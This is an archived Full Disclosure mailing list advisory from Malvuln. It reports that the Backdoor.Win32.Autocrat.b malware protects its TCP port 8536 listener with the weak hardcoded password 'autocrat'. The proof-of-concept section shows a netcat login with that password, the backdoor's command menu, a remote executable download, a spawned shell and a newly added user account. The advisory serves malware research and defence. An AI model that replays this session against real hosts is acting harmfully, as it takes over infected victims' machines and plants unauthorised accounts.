---
title: Backdoor.Win32.Autocrat.b / Weak Hardcoded Credentials
url: https://seclists.org/fulldisclosure/2022/Nov/21
source: Full Disclosure
date: 2022-11-30
fetch_date: 2025-10-04T00:08:15.379079
---

# Backdoor.Win32.Autocrat.b / Weak Hardcoded Credentials

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](20)
[By Date](date.html#21)
[![Next](/images/right-icon-16x16.png)](22)

[![Previous](/images/left-icon-16x16.png)](20)
[By Thread](index.html#21)
[![Next](/images/right-icon-16x16.png)](22)

![](/shared/images/nst-icons.svg#search)

# Backdoor.Win32.Autocrat.b / Weak Hardcoded Credentials

---

*From*: malvuln <malvuln13 () gmail com>
*Date*: Thu, 24 Nov 2022 16:55:45 -0500

---

```
Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2022
Original source:
https://malvuln.com/advisory/4262a8b52b902aa2e6bf02a156d1b8d4.txt
Contact: malvuln13 () gmail com
Media: twitter.com/malvuln
Backup media: infosec.exchange/@malvuln

Threat: Backdoor.Win32.Autocrat.b
Vulnerability: Weak Hardcoded Credentials
Description: The malware is packed with PeCompact, listens on TCP port 8536
and requires authentication. However, the password "autocrat" is weak and
hardcoded within the PE file. Unpacking the executable, easily reveals the
cleartext password.
Family: Autocrat
Type: PE32
MD5: 4262a8b52b902aa2e6bf02a156d1b8d4
Vuln ID: MVID-2022-0660
Dropped files: srvsupp.exe
Disclosure: 11/24/2022

Exploit/PoC:
C:\Users\gg\Desktop>nc64.exe x.x.x.x 8536
Login:autocrat

WinShell v5.0 (C)2002 janker.org

? for help
CMD>?

i Install
r Remove
p Path
b reBoot
d shutDown
s Shell
x eXit
q Quit

Download:
CMD>http://.../srv.exe

? for help
CMD>s
Microsoft Windows [Version 10.0.16299.309]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Users\Victim\Desktop>whoami
whoami
desktop-2c3iqho\victim

C:\Users\Victim\Desktop>net user apparitionsec 666 /add
net user apparitionsec 666 /add
The command completed successfully.

C:\Users\Victim\Desktop>

Disclaimer: The information contained within this advisory is supplied
"as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory,
provided that it is not altered except by reformatting it, and that due
credit is given. Permission is explicitly given for insertion in
vulnerability databases and similar, provided that due credit is given to
the author. The author is not responsible for any misuse of the information
contained herein and accepts no responsibility for any damage caused by the
use or misuse of this information. The author prohibits any malicious use
of security related information or exploits by the author or elsewhere. Do
not attempt to download Malware samples. The author of this website takes
no responsibility for any kind of damages occurring from improper Malware
handling or the downloading of ANY Malware mentioned on this website or
elsewhere. All content Copyright (c) Malvuln.com (TM).
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](20)
[By Date](date.html#21)
[![Next](/images/right-icon-16x16.png)](22)

[![Previous](/images/left-icon-16x16.png)](20)
[By Thread](index.html#21)
[![Next](/images/right-icon-16x16.png)](22)

### Current thread:

* **Backdoor.Win32.Autocrat.b / Weak Hardcoded Credentials** *malvuln (Nov 29)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")